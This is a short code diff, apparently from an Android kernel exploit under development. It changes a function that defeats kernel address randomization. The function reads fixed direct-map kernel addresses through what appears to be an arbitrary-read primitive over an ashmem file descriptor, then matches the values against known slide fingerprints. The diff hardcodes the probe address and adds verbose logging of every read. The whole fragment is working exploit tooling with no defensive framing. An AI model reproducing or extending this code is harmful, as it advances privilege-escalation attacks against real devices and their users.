@@ -79,21 +79,26 @@ static int slide_commit_virtual_base(uint64_t base, const char *source) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 
 static int verify_slide_virtual(int ashmem_fd) {
-  pr_info("virtual slide verification: probing %zu candidates\n",
-          sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]));
+  size_t num_candidates = sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
+  pr_info("virtual slide verification: %zu candidates, probe=0x801f0000\n",
+          num_candidates);
 
-  for (size_t idx = 0;
-       idx < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
-       idx++) {
+  /* Fixed direct map VA for physical probe location */
+  uintptr_t probe_base = 0xffffff8080000000ULL + 0x1f0000ULL;
+
+  for (size_t idx = 0; idx < num_candidates; idx++) {
     uintptr_t slide = p0_fingerprints[idx].slide;
-    /* Use DIRECT MAP virtual address, not kernel text address */
-        uintptr_t probe_base = 0xffffff8080000000ULL + P0_ORACLE_PROBE_OFFSET - slide;
 
     int match = 1;
     for (int w = 0; w < P0_FINGERPRINT_WORDS; w++) {
       uintptr_t addr = probe_base + p0_fingerprint_offsets[w];
       uint64_t value = 0;
       ssize_t ret = configfs_read_once(ashmem_fd, addr, &value, sizeof(value));
+      pr_info("virtual verify: idx=%zu slide=%06zx word=%d addr=%016zx "
+              "ret=%zd val=%016llx expected=%016llx\n",
+              idx, slide, w, addr, ret,
+              (unsigned long long)value,
+              (unsigned long long)p0_fingerprints[idx].words[w]);
       if (ret != (ssize_t)sizeof(value)) {
         match = 0;
         break;
@@ -113,7 +118,6 @@ static int verify_slide_virtual(int ashmem_fd) {
   pr_error("virtual slide verification: no fingerprint matched\n");
   return 0;
 }
-
 #endif
 
 static useconds_t slide_enter_delay_usec(void) {
